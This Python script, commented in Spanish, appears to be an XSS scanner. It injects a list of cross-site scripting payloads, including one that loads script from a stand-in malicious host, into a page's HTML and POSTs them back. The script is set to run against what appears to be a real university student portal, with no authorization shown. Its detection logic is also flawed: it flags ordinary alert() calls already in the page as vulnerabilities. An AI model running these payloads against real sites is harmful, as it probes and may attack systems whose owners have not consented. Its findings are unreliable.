import requests
from bs4 import BeautifulSoup
import re

def detect_xss_vulnerabilities(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='alert(\"XSS\")'></svg>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
        "<img src='javascript:alert(\"XSS\")'>",
        "<script src='https://malicioussite.com/malicious.js'></script>"
    ]
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}

    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, "html.parser")

    for payload in payloads:
        modified_html = str(soup).replace("></", ">" + payload + "</")
        response = requests.post(url, data={"html": modified_html}, headers=headers)

        if payload in response.text:
            print("La URL", url, "puede ser vulnerable a XSS.")
            print("---- Detalles de la vulnerabilidad XSS ----")
            print("Payload utilizado: ", payload)
            print("Respuesta del servidor:")
            print(response.text)
            print("-------------------------------------------")

        # Detalles adicionales de la vulnerabilidad XSS
        scripts = soup.find_all("script")
        for script in scripts:
            script_content = script.string
            if script_content:
                script_content = script_content.strip()
                if re.search(r"(alert|confirm|prompt)\s*\(", script_content):
                    print("La URL", url, "puede ser vulnerable a XSS.")
                    print("---- Detalles de la vulnerabilidad XSS ----")
                    print("Tipo de vulnerabilidad: Cross-Site Scripting (XSS)")
                    print("Elemento HTML afectado: <script>")
                    print("Contenido del script:")
                    print(script_content)
                    print("-------------------------------------------")

# URL objetivo para probar el script
target_url = "https://guarani.uba.ar/cbc/"

# Llamamos a la función para detectar vulnerabilidades de XSS
detect_xss_vulnerabilities(target_url)

